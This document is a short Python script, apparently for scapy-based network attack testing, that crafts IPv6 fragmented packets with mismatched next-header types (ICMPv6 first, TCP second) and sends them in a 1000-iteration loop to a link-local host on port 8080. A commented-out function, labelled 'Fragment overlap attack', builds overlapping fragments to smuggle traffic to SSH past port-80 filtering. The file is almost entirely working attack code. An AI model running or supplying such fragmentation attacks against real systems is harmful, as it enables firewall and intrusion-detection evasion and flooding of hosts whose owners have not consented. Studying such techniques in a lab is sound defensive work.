from scapy.all import *
from scapy.layers.inet import TCP
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, IPv6ExtHdrFragment
from scapy.layers.l2 import Ether

source = "fe80::a00:27ff:fe3b:c7d"
number_packets = 1000
destination = "fe80::a00:27ff:fe4c:1052"
s_port = 1055
d_port = 8080


def tcp_fragment():
    payload1 = ''
    for i in range(1280):
        payload1 = payload1 + 'A'
    payload2 = ''
    for i in range(1280):
        payload2 = payload2 + 'B'
    # source = str(RandIP6())
    packet_1 = IPv6(dst=destination, src=source) / IPv6ExtHdrFragment(
        offset=0, m=1, id=511, nh=58) / ICMPv6EchoRequest(cksum=0x7b57, data=payload1)
    packet_2 = IPv6(dst=destination, src=source) / IPv6ExtHdrFragment(
        offset=162, m=0, id=511, nh=6) / TCP(sport=s_port, dport=d_port) / payload2
    # packet_1=ip6/frag1/icmpv6
    # packet_2=ip6/frag2/tcpheader/payload2
    # Send Packets
    send(packet_1)
    send(packet_2)


for i in range(number_packets):
    tcp_fragment()


# def frag_overlap():
#     print("Fragment overlap attack")
#     num_tail_packets = 20
#     frag_id = RandNum(1, 2 ** 32)._fix()
#     first_port = 80
#     second_port = 22
#     offset = 2
#     first = [IPv6(dst=destination) / IPv6ExtHdrFragment(id=frag_id) / TCP(dport=first_port) / Raw(
#         "GET /some/valid/file.php")]
#     second = [IPv6(dst=destination) / IPv6ExtHdrFragment(id=frag_id, offset=offset) / TCP(dport=second_port,
#                                                                                           flags="S") / Raw(
#         "SSH KEX STUFF")]
#     tail = [IPv6(dst=destination) / IPv6ExtHdrFragment(id=frag_id) / TCP(dport=second_port, flags="A") / Raw(
#         load=([RandString] * 10))]
#     # packets = first + second + tail_new
#     send(first)
#     send(second)
#     for a in range(num_tail_packets):
#         send(tail)
# 
# 
# for i in range(number_packets):
#     frag_overlap()
